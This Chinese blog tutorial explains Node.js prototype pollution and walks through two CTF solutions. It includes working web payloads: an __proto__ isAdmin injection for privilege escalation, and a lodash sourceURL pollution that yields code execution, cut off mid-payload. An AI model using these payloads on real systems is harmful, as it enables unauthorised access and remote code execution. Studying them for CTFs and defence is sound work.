{"title":"浅析CTF中的Node.js原型链污染","uid":"13607f594fc71a1c9cef23b62fe9395c","slug":"浅析CTF中的Node.js原型链污染","date":"2023-02-18T16:14:20.000Z","updated":"2023-04-07T16:54:46.000Z","comments":true,"path":"api/articles/浅析CTF中的Node.js原型链污染.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080051519.webp","content":"<h1 id=\"声明\"><a href=\"#声明\" class=\"headerlink\" title=\"声明\"></a>声明</h1><p>文章首发于Freebuf社区<a href=\"https://www.freebuf.com/articles/web/361333.html\">https://www.freebuf.com/articles/web/361333.html</a></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p><code>Node.js</code>之前并未有太多了解，最近遇上了一些相关题目，发现原型链污染是其一个常考点，在学习后对其进行了简单总结，希望对正在学习的师傅有所帮助</p>\n<h1 id=\"Node-js\"><a href=\"#Node-js\" class=\"headerlink\" title=\"Node.js\"></a>Node.js</h1><h2 id=\"原型链污染\"><a href=\"#原型链污染\" class=\"headerlink\" title=\"原型链污染\"></a>原型链污染</h2><p>首先强推这篇文章<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E6%96%B9%E6%B3%95%E6%9D%A5%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%94%9F%E6%88%90%E5%8E%9F%E5%9E%8B%E9%93%BE\">https://developer.mozilla.org/</a>，读完后就会对原型链有个大致的了解，对后面学习非常有帮助。<br>所以说什么是原型链污染呢？</p>\n<p>偏官方一点的解释如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>在JavaScript中，每个对象都有一个原型，它是一个指向另一个对象的引用。当我们访问一个对象的属性时，如果该对象没有这个属性，JavaScript引擎会在它的原型对象中查找这个属性。这个过程会一直持续，直到找到该属性或者到达原型链的末尾。<br>攻击者可以利用这个特性，通过修改一个对象的原型链，来污染程序的行为。例如，攻击者可以在一个对象的原型链上设置一个恶意的属性或方法，当程序在后续的执行中访问该属性或方法时，就会执行攻击者的恶意代码。</p></blockquote>\n<p>简单的说呢，其实就是我们对原链中的某个属性进行了污染，向其中插入恶意代码，当我们再调用这个链（也就是使用这个对象）时，我们的恶意代码就会被触发，此时就达到了一个执行恶意代码的效果。<br>说到原型链污染，那就肯定离不开<code>__proto__</code>和<code>prototype</code>,所以接下来我们需要了解一下这两个是什么东西。</p>\n<h3 id=\"proto-和prototype\"><a href=\"#proto-和prototype\" class=\"headerlink\" title=\"__proto__和prototype\"></a>__proto__和prototype</h3><p>在<code>JavaScript</code>中，每个对象都有一个名为<code>__proto__</code>的内置属性，它指向该对象的原型。同时，每个函数也都有一个名为 <code>prototype </code> 的属性，它是一个对象，包含构造函数的原型对象应该具有的属性和方法。简单来说，<code>__proto__ </code> 属性是指向该对象的原型，而 <code>prototype</code>属性是用于创建该对象的构造函数的原型。</p>\n<p>这么说有点抽象，因此这里举个例子来进行说明，首先我们打开谷歌浏览器，F12，切换到控制台，而后我们写入如下代码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">function Person(name) &#123;\n  this.name &#x3D; name;\n&#125;\n\nPerson.prototype.greet &#x3D; function() &#123;\n  console.log(&#96;Hello, my name is $&#123;this.name&#125;&#96;);\n&#125;;\n\nconst person1 &#x3D; new Person(&#39;Alice&#39;);\nperson1.greet(); &#x2F;&#x2F; 输出 &quot;Hello, my name is Alice&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在例子中，我们创建了一个名为 <code>Person</code>的构造函数，并将<code>prototype</code>上的<code>greet</code>设置为一个打招呼的函数。当我们创建一个名为<code>person1</code>的实例时，它会继承<code>Person.prototype</code>对象上的<code>greet</code>方法。因此，当我们调用<code>person1.greet()</code>时，它会输出 <code>&quot;Hello, my name is Alice&quot;</code>。<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029773.jpeg\" alt=\"在这里插入图片描述\"><br>从这里就可以看出，<code>prototype</code>是类<code>Person</code>的一个属性，所有用类<code>Person</code>进行实例化的对象，都会拥有<code>prototype</code>的全部内容。</p>\n<p>我们实例化出来的<code>person1</code>对象，它是不能通过<code>prototype</code>访问原型的，但通过<code>__proto__</code>就可以实现访问<code>Person</code>原型，具体代码如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">console.log(person1.__proto__ &#x3D;&#x3D;&#x3D; Person.prototype); &#x2F;&#x2F; 输出 true<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029768.jpeg\" alt=\"在这里插入图片描述\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>总结（摘自<a href=\"https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript\">https://www.leavesongs.com</a>）<br>1、prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法<br>2、一个对象的__proto__属性，指向这个对象所在的类的prototype属性</p></blockquote>\n<p>他们的关系图如下所示<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029821.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"具体过程\"><a href=\"#具体过程\" class=\"headerlink\" title=\"具体过程\"></a>具体过程</h3><p>那么什么是原型链污染呢<br>我们这里用一个简单例子来对其进行说明</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var a &#x3D; &#123;number : 520&#125;\nvar b &#x3D; &#123;number : 1314&#125;\nb.__proto__.number&#x3D;520 \nvar c&#x3D; &#123;&#125;\nc.number<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029913.jpeg\" alt=\"在这里插入图片描述\"><br>对这里的情况需要进行简单说明，我们可以看到在我们进行<code>b.__proto__.number=520 </code> 操作后，即使是内容为空的<code>c</code>，调用<code>number</code>属性仍存在且值为我们设定的520，这时就达到了一个原型链污染的目的。接下来再说一下可能部分师傅有疑问的点</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>一、为什么执行过<code>b.__proto__.number=520 </code> 后，我们输出b的值，其值仍为1314</p></blockquote>\n<p>这是因为在JavaScript中存在这样一种继承机制：<br>我们这里调用<code>b.number</code>时，它的具体调用过程是如下所示的</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1、在b对象中寻找number属性\n2、当在b对象中没有找到时，它会在b.__proto__中寻找number属性\n3、如果仍未找到，此时会去b.__proto__.__proto__中寻找number属性<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>也就是说，它从自身开始寻找，然后一层一层向上递归寻找，直到找到或是递归到<code>null</code>为止，此机制被称为<code>JavaScript继承链</code>，我们这里的污染的属性是在<code>b.__proto__</code>中，而我们的<code>b</code>对象本身就有<code>number</code>，所以其值并未改变。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>二、为什么新建的值为空的c对象，调用<code>c.number</code>竟然有值而且为我们设定的520</p></blockquote>\n<p>当明白上个问题时，这个问题也就迎刃而解了，我们这里的<code>c</code>对象虽然是空的，但<code>JavaScript继承链</code>的机制就会使它继续递归寻找，此时也就来到了<code>c.__proto__</code>中寻找<code>number</code>属性，我们刚刚进行了原型链污染，它的<code>c.__proto__</code>其实就是<code>Object.protoype</code>，而我们进行污染的<code>b.__proto__</code>也是<code>Object.prototype</code>，所以此时它调用的<code>number</code>就是我们刚刚污染的属性，所以这也就是为什么<code>c .number=520</code></p>\n<p>它常见于当存在函数（其功能是将一个数组的内容复制到另一个数组中）的情况下，示例如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">function merge(target, source) &#123;\n    for (let key in source) &#123;\n        if (key in source &amp;&amp; key in target) &#123;\n            &#x2F;&#x2F; 如果target与source有相同的键名 则让target的键值为source的键值\n            merge(target[key], source[key])\n        &#125; else &#123;\n            target[key] &#x3D; source[key]  &#x2F;&#x2F; 如果target与source没有相通的键名 则直接在target新建键名并赋给键值\n        &#125;\n    &#125;\n&#125;\nlet o1 &#x3D; &#123;&#125;\nlet o2 &#x3D;  JSON.parse&#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 &#x3D; &#123;&#125;\nconsole.log(o3.b)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029941.jpeg\" alt=\"在这里插入图片描述\"><br>这里的话可以看到我们的o3内容为空，但调用b属性也是成功输出了<code>2</code>，说明我们刚刚的原型链污染成功了，这里也说一下可能部分师傅有疑问的点。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>一、为什么要加JSON.parse，这个函数有什么作用，不加会怎么样？</p></blockquote>\n<p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的<code>键名</code>，而不代表<code>原型</code>，所以在遍历o2的时候会存在这个键。当不加的时候，他就会认为他是一个原型，此时情况如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029926.jpeg\" alt=\"在这里插入图片描述\">所以这也就是我们需要添加这个函数的原因</p>\n<h2 id=\"小拓展（js大小写特性）\"><a href=\"#小拓展（js大小写特性）\" class=\"headerlink\" title=\"小拓展（js大小写特性）\"></a>小拓展（js大小写特性）</h2><p>对于<code>toUpperCase()</code>函数</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>对于<code>toLowerCase</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>详情可见<a href=\"https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html\">https://www.leavesongs.com/</a></p>\n<h1 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h1><h2 id=\"CatCTF-2022-wife\"><a href=\"#CatCTF-2022-wife\" class=\"headerlink\" title=\"CatCTF 2022 wife\"></a>CatCTF 2022 wife</h2><p>环境参考<a href=\"https://adworld.xctf.org.cn/challenges/list\">https://adworld.xctf.org.cn/challenges/list</a><br>打开题目<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029350.jpeg\" alt=\"在这里插入图片描述\"><br>发现是一个登录界面，给出了注册界面，点击注册界面，可以发现需要一个邀请码<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029495.jpeg\" alt=\"在这里插入图片描述\"><br>如果没有邀请码的话，我们进去是这个样子<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029528.jpeg\" alt=\"在这里插入图片描述\"><br>此时如果考虑到JS原型链污染的话，就变得简单了，应该是我们越权拿到管理员权限，从而获取<code>flag</code>，其注册界面源码如下所示（比赛时是黑盒，这里并未给出源码）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">app.post(&#39;&#x2F;register&#39;, (req, res) &#x3D;&gt; &#123;\n    let user &#x3D; JSON.parse(req.body)\n    if (!user.username || !user.password) &#123;\n        return res.json(&#123; msg: &#39;empty username or password&#39;, err: true &#125;)\n    &#125;\n    if (users.filter(u &#x3D;&gt; u.username &#x3D;&#x3D; user.username).length) &#123;\n        return res.json(&#123; msg: &#39;username already exists&#39;, err: true &#125;)\n    &#125;\n    if (user.isAdmin &amp;&amp; user.inviteCode !&#x3D; INVITE_CODE) &#123;\n        user.isAdmin &#x3D; false\n        return res.json(&#123; msg: &#39;invalid invite code&#39;, err: true &#125;)\n    &#125;\n    let newUser &#x3D; Object.assign(&#123;&#125;, baseUser, user)\n    users.push(newUser)\n    res.json(&#123; msg: &#39;user created successfully&#39;, err: false &#125;)\n&#125;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们这里注意到<code>Object.assign</code>方法，他类似之前示例说的<code>clone</code>函数，<code>Object.assign</code>这个方法是可以触发原型链污染的，所以我们这里污染<code>__proto__.isAdmin</code>为 <code>true </code> 就可以了。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>此时便可越权拿到flag<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029538.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"Code-Breaking-2018-Thejs\"><a href=\"#Code-Breaking-2018-Thejs\" class=\"headerlink\" title=\"Code-Breaking 2018 Thejs\"></a>Code-Breaking 2018 Thejs</h2><p>源码参考<a href=\"https://code-breaking.com/puzzle/9/#promo-block\">https://code-breaking.com/puzzle/9/#promo-block</a><br>搭建环境的话，先安装一下<code>express</code>框架</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cnpm i express -S<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029535.jpeg\" alt=\"在这里插入图片描述\"><br>而后再安装一下<code>lodash</code>模块即可</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">npm install lodash<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>而后通过<code>node server.js</code>即可开启题目环境<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029548.jpeg\" alt=\"在这里插入图片描述\"><br>环境如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029939.jpeg\" alt=\"在这里插入图片描述\"><br>接下来简单看一下代码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#server.js\nconst fs &#x3D; require(&#39;fs&#39;)\nconst express &#x3D; require(&#39;express&#39;)\nconst bodyParser &#x3D; require(&#39;body-parser&#39;)\nconst lodash &#x3D; require(&#39;lodash&#39;)\nconst session &#x3D; require(&#39;express-session&#39;)\nconst randomize &#x3D; require(&#39;randomatic&#39;)\n\nconst app &#x3D; express()\napp.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())\napp.use(&#39;&#x2F;static&#39;, express.static(&#39;static&#39;))\napp.use(session(&#123;\n    name: &#39;thejs.session&#39;,\n    secret: randomize(&#39;aA0&#39;, 16),\n    resave: false,\n    saveUninitialized: false\n&#125;))\napp.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; &#x2F;&#x2F; define the template engine\n    fs.readFile(filePath, (err, content) &#x3D;&gt; &#123;\n        if (err) return callback(new Error(err))\n        let compiled &#x3D; lodash.template(content)\n        let rendered &#x3D; compiled(&#123;...options&#125;)\n\n        return callback(null, rendered)\n    &#125;)\n&#125;)\napp.set(&#39;views&#39;, &#39;.&#x2F;views&#39;)\napp.set(&#39;view engine&#39;, &#39;ejs&#39;)\n\napp.all(&#39;&#x2F;&#39;, (req, res) &#x3D;&gt; &#123;\n    let data &#x3D; req.session.data || &#123;language: [], category: []&#125;\n    if (req.method &#x3D;&#x3D; &#39;POST&#39;) &#123;\n        data &#x3D; lodash.merge(data, req.body)\n        req.session.data &#x3D; data\n    &#125;\n\n    res.render(&#39;index&#39;, &#123;\n        language: data.language, \n        category: data.category\n    &#125;)\n&#125;)\n\napp.listen(3000, () &#x3D;&gt; console.log(&#96;Example app listening on port 3000!&#96;))<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>首先我们这里可以发现存在<code>merge</code>函数</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">if (req.method &#x3D;&#x3D; &#39;POST&#39;) &#123;\n        data &#x3D; lodash.merge(data, req.body)\n        req.session.data &#x3D; data\n    &#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的含义也是比较简单，即将我们POST提交的信息，通过<code>merge</code>合并到<code>session</code>中，最终我们所有提交的信息都会被保存到session中去，那么存在这个<code>merge</code>函数的话，说明我们可以进行原型链污染，那么我们污染的参数该是什么呢，我们这个时候看这几行代码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">fs.readFile(filePath, (err, content) &#x3D;&gt; &#123;\n        if (err) return callback(new Error(err))\n        let compiled &#x3D; lodash.template(content)\n        let rendered &#x3D; compiled(&#123;...options&#125;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以发现其对内容进行了<code>lodash.template</code>处理，我们跟进这个函数，具体代码可见<a href=\"https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165\">https://github.com/lodash</a></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029981.jpeg\" alt=\"image-20230330232013524\"></p>\n<p>可以发现这个<code>sourceURL</code>当没有值的时候就是一个空的状态，而当其有值时，就会取当前的这个值，我们看接下来他怎么处理<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029955.jpeg\" alt=\"在这里插入图片描述\"><br>可以发现这里被放入了Function的第二个参数，此时我们就可以实现代码执行了。<br>所以我们污染的参数就是<code>sourceURL</code>，具体<code>Payload</code>如下所示</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;&quot;__proto__&quot; : &#123;&quot;sourceURL&quot; : &quot;\\r\\n return e &#x3D;&gt; &#123;for (var a in &#123;&#125; 